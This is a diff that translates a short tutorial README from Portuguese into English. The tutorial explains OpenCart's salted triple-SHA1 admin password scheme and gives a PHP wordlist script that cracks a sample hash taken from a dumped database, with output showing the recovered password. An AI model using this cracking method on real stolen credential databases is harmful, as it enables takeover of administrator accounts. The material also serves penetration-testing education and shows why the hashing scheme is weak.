@@ -1,18 +1,18 @@
 # Brute Force Attack In OpenCart Stored Passwords.
-Nesse pequeno tutorial eu ensino como realizar um ataque de força bruta baseado em lista de palavras em senhas armazenadas em bancos de dados de aplicações OpenCart
+In this little tutorial I demonstrate how to perform a brute force attack based in word lists on passwords stored in OpenCart application databases.
 
 
-## CENÁRIO:
-- Você conseguiu acesso ao banco de dados de uma determinada aplicação que usa OpenCart.
-- Você consulta a Hash e o Salt da senha na tabela do administrator e obtém o seguinte resultado:
+## SCENERY:
+- You have access to the database of an application that uses OpenCart.
+- You query the Password Hash and Salt in the administrator table and you get the following result:
 
 | password      						  | salt    | email             | status | username    | lastname | ip        | firstname |
 |-----------------------------------------|---------|-------------------|--------|-------------|----------|-----------|-----------|
 |f2e9efd4a366507c5b1cba7749659d93d61ae335 |oInuc412L| admin@pentest-server.com 	| 1      | Admin       | das ganbi| 127.0.0.1 | developer |
 
 
-## PROBLEMA:
-Você não conhece o sistema de criptografia de senhas do OpenCart, Então você vai tentar desvendar essa `hash` com força bruta comum usando criptografia SHA1.
+## PROBLEM:
+You are not familiar with the OpenCart password encryption system, so you will try to unmask this `hash` with brute force using services that are based on simple SHA1 encryption.
 
 ```php
 #exemple:
@@ -24,41 +24,42 @@ $lines = file('wordlis.txt', FILE_IGNORE_NEW_LINES);
 foreach($lines as $string)
 {
    $hashed=SHA1($string);
-   if($hashed==$password){echo "SENHA: ".$string;} else{}
+   if($hashed==$password){echo "PASSWORD: ".$string;} else{}
 }
 ?>
 ```
 
 
-O problema é que `$password` (senha do admin) não é simplesmente uma string criptografada com SHA1, Ou MD5, Ou SHA1(MD5).. Enfim, Um script de força bruta usual baseado nesses modelos de criptografia dificilmente geraria uma `hash` igual a `hash` que você quer "desvendar".
+The problem is that `$ password` is not simply a string encrypted with SHA1, or MD5, or SHA1 (MD5) ... Anyway, a usual brute-force script based on these encryption templates would hardly generate a` hash` equal to `hash` that you want to 'unmask'.
 
-## SOLUÇÃO:
-Precisamos criar nosso próprio script que vai procurar a string da `hash` da forma correta.
-E qual seria essa forma correta?.
+## SOLUCTION:
+We need to create our own script that will search the hash string in the correct form.
+And what would be the correct way?
 
-SE OLHARMOS O ARQUIVO PHP QUE FAZ A AUTENTICAÇÃO DO ADMIN NO OPENCART
+SE CHECARMOS O ARQUIVO PHP QUE FAZ A AUTENTICAÇÃO DO ADMIN NO OPENCART
 `\opencart\system\library\user.php`
 
-ENCONTRAMOS O SEGUINTE CÓDIGO:
+WE FIND THE FOLLOWING CODE:
 ```
 $user_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "user WHERE username = '" . $this->db->escape($username) . "' AND (password = SHA1(CONCAT(salt, SHA1(CONCAT(salt, SHA1('" . $this->db->escape($password) . "'))))) OR password = '" . $this->db->escape(md5($password)) . "') AND status = '1'");
 ```
 
-A PARTE QUE NOS INTERESSA:
+INTERESTING PART:
 ```
 password = SHA1(CONCAT(salt, SHA1(CONCAT(salt, SHA1('" . $this->db->escape($password) . "'))))) OR password = '" . $this->db->escape(md5($password)) . "')
 ```
 
-ADAPTANDO O CÓDIGO TEMOS:
+ADAPTING THE CODE WE HAVE:
 ```
 $password=SHA1($salt.SHA1($salt.SHA1($password)));
 ```
 
-**obs**: ignorei a parte `OR password = '" . $this->db->escape(md5($password)) . "')` já que testamos nossa hash e já sabemos que é SHA1, certo?
+**obs**: I ignored this part `OR password = '" . $this->db->escape(md5($password)) . "')` since we tested our hash and we already know that it is SHA1, right?
 
-## Agora já sabemos como devemos criptografar as strings da nossa wordlist para comparar com a `hash` encontrada na tabela do administrador.
 
-Um script simples em php para testar força bruta em senhas OpenCart ficaria assim:
+## Now we know how to encrypt the strings of our wordlist to compare with the hash found in the admin table.
+
+A simple php script to test brute force on OpenCart passwords would look like this:
 
 
 ```php
@@ -72,14 +73,14 @@ $lines = file('wordlis.txt', FILE_IGNORE_NEW_LINES);
 foreach($lines as $string)
 {
    $hashed=SHA1($salt.SHA1($salt.SHA1($string)));
-   if($hashed==$password){echo "SENHA: ".$string;} else{}
+   if($hashed==$password){echo "PASSWORD: ".$string;} else{}
 }
 ?>
 ```
 
 ```
 C:\Users\demo\open-cript-master>php opencript.php
-SENHA: 12345
+PASSWORD: 12345
 ```
 
 ###### _NEED ME? [pablov3rlly gmail com]_
